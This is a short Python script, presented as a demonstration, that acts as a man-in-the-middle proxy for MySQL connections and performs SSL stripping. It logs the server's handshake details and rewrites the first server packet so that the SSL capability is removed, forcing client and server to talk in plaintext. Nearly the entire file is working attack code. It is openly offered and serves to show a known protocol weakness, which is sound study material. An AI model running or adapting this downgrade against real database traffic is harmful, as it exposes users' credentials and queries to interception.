#!/bin/env python3
import socket
import select
import struct
import dolfijn

# This is a proxy which demonstrates SSL stripping for the MySQL protocol.

if __name__ == '__main__':
    backend = ('127.0.0.1', 5710)
    frontend = ('127.0.0.1', 5700)
    bufsize = 1024

    fe = socket.socket()
    fe.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    fe.bind(frontend)
    fe.listen(1)

    proxy_connid = 0
    while True:
        proxy_connid += 1
        befirst = True
        fefirst = True
        end_connection = False

        (feconn, feaddr) = fe.accept()
        be = socket.socket()
        be.connect(backend)

        while True:
            if end_connection:
                break
            (rlist, wlist, olist) = select.select([be, feconn], [], [])
            if feconn in rlist:
                fedata = b''
                while True:
                    fragment = feconn.recv(bufsize)
                    fedata += fragment
                    if fragment == b'':
                        end_connection = True
                    if len(fragment) != bufsize:
                        break
                if fefirst:
                    fefirst = False
                    feresp = dolfijn.Response(packet=fedata)
                    print('[%d] FE SSL           : %s'
                          % (proxy_connid, feresp.has_ssl))
                be.sendall(fedata)
            if be in rlist:
                bedata = b''
                while True:
                    fragment = be.recv(bufsize)
                    bedata += fragment
                    if fragment == b'':
                        end_connection = True
                    if len(fragment) != bufsize:
                        break
                if befirst:
                    befirst = False
                    behs = dolfijn.Handshake(packet=bedata)
                    print('[%d] BE Server Version: %s'
                          % (proxy_connid, behs.server_version))
                    print('[%d] BE Connection ID : %s'
                          % (proxy_connid, behs.connection_id))
                    print('[%d] BE SSL           : %s'
                          % (proxy_connid, behs.has_ssl))
                    print('[%d] BE Stripping SSL' % proxy_connid)
                    bedata = behs.packet_no_ssl()
                feconn.sendall(bedata)
